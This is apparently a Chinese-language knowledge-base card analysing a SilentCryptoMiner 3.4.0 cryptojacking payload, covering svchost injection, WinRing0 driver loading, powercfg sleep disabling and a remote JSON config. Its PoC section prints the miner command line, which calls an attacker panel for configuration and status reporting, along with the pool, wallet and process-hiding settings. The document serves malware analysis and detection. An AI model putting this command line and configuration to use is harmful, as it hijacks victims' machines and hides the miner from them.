---
id: code-analysis-reverse-windows-silentcryptominer-340-svchost-powercfg-winring0
title: SilentCryptoMiner 3.4.0 挖矿载荷：powercfg 关闭睡眠 + svchost 注入 UPX 载荷 + WinRing0 驱动 + 远程 prohashing 配置
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: silentcryptominer-340-svchost-powercfg-winring0-remote-config
tags:
- cryptominer
- silentcryptominer
- xmrig
- winring0
- process-injection
- upx
- powercfg
- nicehash
- prohashing
- malware-analysis
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V323
  verified_at: '2026-11-08T16:23:26+08:00'
  notes: 已对照 content.md 第 189-227 行与 img/41-47 核对：powercfg 四条 -hibernate/-standby-timeout-ac/dc 0；svchost(PID 2016) 内存 MZ/PE/UPX0/UPX1/.rsrc 与 VMMap 约 8,472KB RWX 区域；%TEMP% wujyovynvvlj.sys 与 winring0.pdb；prohashingv1.json 的 algo/pool/port/wallet/nicehash/max-cpu/idle/stealth-targets 与命令行 --cinit-* 均与原文一致。已修正：活动归因由错误的 Festi 改为 GitHub 免杀工具投毒活动（Origami/Scantime Crypter 仓库），并把 8,472,416 字节改为 VMMap 的 8,472KB；staging 同步修正。原子性：单一 SilentCryptoMiner 3.4.0 样本分析场景（与既有 3.4.1 服务持久化+dialer 注入卡为不同版本/不同注入链，append_scenario 理由成立），合格。未验证点：未运行样本/未加载驱动。dedup 工具候选为空，人工补查同族 3.4.1 卡非同链。
url: /docs/code-analysis/reverse/windows/code-analysis-reverse-windows-silentcryptominer-340-svchost-powercfg-winring0/
draft: false
kb_aliases:
- SilentCryptoMiner 3.4.0
- prohashing 挖矿
- randomxmonero nicehash
- cinit-remote-config
- wujyovynvvlj.sys
- WinRing0 PDB
- svchost UPX 注入
---

## 一句话结论

GitHub 免杀工具投毒活动（Origami/Scantime Crypter 仓库）投放的挖矿载荷是 SilentCryptoMiner 3.4.0：它先用 `powercfg.exe` 关闭交流/直流下的休眠与待机超时，把 UPX 加壳的挖矿模块注入 `svchost.exe`（内存中出现 8.4 MB 的可执行 `MZ/PE/UPX0/UPX1/.rsrc` 镜像），释放并加载 WinRing0 驱动 `wujyovynvvlj.sys`，再通过 `--cinit-remote-config` 从 `webpanel.elementfx.com/remote/prohashingv1.json` 拉取矿池/钱包/隐身进程列表等配置（NiceHash RandomX 矿池、钱包 `36u5w8pHbiKPB18NAz8GEgjx9kXBUxs5YC`）。

## 原理

- **挖矿载荷来源**：命令行中的 `--cinit-winring`、`--cinit-remote-config`、`--cinit-stealth-targets`、`--cinit-api`、`--cinit-version=3.4.0`、`--cinit-id` 是 SilentCryptoMiner builder 生成客户端的特征参数；版本 3.4.0 与作者此前分析的 3.4.1 同族。
- **关闭睡眠/待机**：载荷调用 `C:\Windows\system32\powercfg.exe /x -hibernate-timeout-ac 0`、`/x -standby-timeout-ac 0`、`-hibernate-timeout-dc 0`、`-standby-timeout-dc 0`，把交流/电池下的休眠和待机超时设为 0（永不），保证矿机长时间在线，不受用户电源计划影响。
- **svchost 注入**：挖矿模块被注入 `svchost.exe`（原文 PID 2016），内存中出现从 `0x140000000` 起的 PE 映像与约 8.4 MB（VMMap 显示 8,472 KB）权限 `RWX` 的私有区域；转储可见 `MZ`、`PE`、`UPX0`、`UPX1`、`.rsrc` 节，说明注入的是 UPX 加壳的完整 PE（xmrig 系挖矿程序），在内存中解压执行。
- **WinRing0 驱动**：载荷把 `wujyovynvvlj.sys` 释放到 `C:\Users\<user>\AppData\Local\Temp\`（shellcode 中路径 `\\??\\C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\wujyovynvvlj.sys`），IDA 中 PDB 为 `d:\hproject\winring0\source\dlls\lib\amd64\winring0.pdb`，即 xmrig 常用的 WinRing0x64.sys 签名驱动，用于读取 MSR 支持 RandomX。
- **远程配置**：客户端通过 `--cinit-remote-config=http://webpanel.elementfx.com/remote/prohashingv1.json` 拉取配置。原文抓到的 JSON 包含：`algo=rx/0`、`pool=stratum+tcp://randomxmonero.auto.nicehash.com`、`port=9200`、`wallet=36u5w8pHbiKPB18NAz8GEgjx9kXBUxs5YC.{RANDOM}`、`nicehash=true`、`max-cpu=40`、`idle-wait=0`、`idle-cpu=80`、`stealth-targets=Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe`、`stealth-fullscreen=false`。命令行同时出现 `us.mining.prohashing.com:3359`、`--user=haddaame` 等另一组矿池参数，说明远程配置可覆盖/补充本地参数。
- **隐身与上报**：`stealth-targets` 让 rootkit 在任务管理器、Process Hacker、perfmon 等进程枚举时隐藏挖矿进程；`--cinit-api=http://webpanel.elementfx.com/api/endpoint.php` 用于向攻击者面板上报状态/接收指令；`--cinit-id` 标识受害者。
- **为什么能挖**：WinRing0 提供 MSR 访问，RandomX 在 CPU 上高效；注入 svchost 让挖矿进程看起来像系统进程；关闭睡眠保证算力持续；远程配置让攻击者随时换矿池/钱包/隐身策略。

## 触发条件

- 受害者已执行上游投毒工具/脚本并获得用户或管理员权限（加载驱动、注入系统进程通常需要管理员）。
- 系统允许加载 WinRing0x64.sys（合法签名驱动，但常被滥用；部分 EDR 会拦截）。
- 主机可出网访问 `webpanel.elementfx.com`、矿池（NiceHash/prohashing）；CPU 资源可被长期占用。
- 仅用于授权恶意样本分析。

## 利用步骤

1. 检查电源配置：`powercfg /query` 或注册表确认休眠/待机超时被改为 0；进程列表中 `powercfg.exe` 带 `-hibernate-timeout-ac/dc 0`、`-standby-timeout-ac/dc 0` 参数。
2. 检查进程：`svchost.exe` 是否有异常实例、内存中是否有 `PAGE_EXECUTE_READWRITE`/`MEM_PRIVATE` 区域；转储该区域确认 `MZ/PE/UPX0/UPX1` 结构。
3. 查找释放的驱动：`%TEMP%\wujyovynvvlj.sys` 或类似随机名 `.sys`，与 WinRing0x64.sys 哈希/PDB 对比；确认 `--cinit-winring` 指向该文件。
4. 提取命令行/配置：`strings`/Process Explorer 查看 svchost 注入模块的命令行，搜索 `--cinit-`、`--url=`、`--algo=rx/0`、`--user`；请求 `prohashingv1.json` 获得矿池/钱包/隐身列表。
5. 检查网络：连接 NiceHash/prohashing 矿池端口、`webpanel.elementfx.com` 的 HTTP 请求。
6. 记录 IOC：矿池地址/端口、钱包、面板 URL、驱动文件名/PDB、注入宿主、`--cinit-id`。

## PoC

```text
# 原文提取的挖矿命令行（关键片段）
svchost.exe --algo=rx/0 --url=us.mining.prohashing.com:3359 --user="haddaame" --pass="x" \
  --cpu-max-threads-hint=40 --cinit-winring="wujyovynvvlj.sys" \
  --cinit-remote-config="http://webpanel.elementfx.com/remote/prohashingv1.json" \
  --cinit-stealth-targets="Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe" \
  --cinit-api="http://webpanel.elementfx.com/api/endpoint.php" \
  --cinit-version="3.4.0" --cinit-id="fothtlmlfehptdpz"
```

```json
// 远程配置 prohashingv1.json（原文）
{
  "algo": "rx/0",
  "pool": "stratum+tcp://randomxmonero.auto.nicehash.com",
  "port": 9200,
  "wallet": "36u5w8pHbiKPB18NAz8GEgjx9kXBUxs5YC.{RANDOM}",
  "pass": "x",
  "nicehash": true,
  "max-cpu": 40,
  "idle-wait": 0,
  "idle-cpu": 80,
  "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
  "stealth-fullscreen": false
}
```

电源命令：

```text
C:\Windows\system32\powercfg.exe /x -hibernate-timeout-ac 0
C:\Windows\system32\powercfg.exe /x -standby-timeout-ac 0
C:\Windows\system32\powercfg.exe /x -hibernate-timeout-dc 0
C:\Windows\system32\powercfg.exe /x -standby-timeout-dc 0
```

## 变体与关联

- **同族**：[[code-analysis-reverse-windows-silentcryptominer-service-injection-winring0]]（3.4.1 的服务持久化 + WinRing0 + 明文配置；本卡是 3.4.0 经 svchost 注入 + powercfg + 远程配置的变体）、[[pentest-c2-encrypted-payload-dialer-injection-watchdog-mutex]]（dialer.exe 注入与互斥量）。
- **上游链**：[[pentest-initial-access-github-trojanized-fud-crypter-tools]]（GitHub 投毒入口）、[[pentest-persistence-temp-hidden-dll-run-key-regsvr32-odbcconf]]（DLL 持久化）、[[pentest-c2-powershell-amsiinitfailed-reflection-bypass]]（AMSI 绕过）。
- **变体**：注入宿主可换成 dialer.exe、svchost、regsvr32 等；矿池可换 NiceHash/prohashing/2miners；配置可本地硬编码或远程 JSON；驱动可换其他 MSR 驱动。
- **边界**：WinRing0 被 EDR/驱动黑名单拦截、矿池/面板域名被阻断、主机休眠/关机时挖矿停止；该载荷只挖矿，不提供远控。

## 检测与防御

- **进程/内存**：监控 svchost 等系统进程的 RWX 私有区域与 UPX 特征；`powercfg` 修改休眠/待机超时为 0 的行为；`%TEMP%` 下随机名 `.sys`（WinRing0 PDB/哈希）。
- **网络**：阻断/告警 `randomxmonero.auto.nicehash.com`、`us.mining.prohashing.com`、`webpanel.elementfx.com`；监控长时间矿池协议连接。
- **配置**：限制普通用户执行 `powercfg` 修改电源策略（需管理员）；监控 `--cinit-*` 参数出现在异常进程命令行。
- **防御**：启用 WinRing0 驱动黑名单/驱动签名策略、EDR 内存扫描；对系统进程注入与异常线程做告警；矿池域名/DNS 情报阻断。
- **响应**：隔离主机、结束注入进程、删除驱动与计划任务/Run 键、更改钱包相关无意义但检查凭据泄露、评估 CPU 占用与数据外泄。
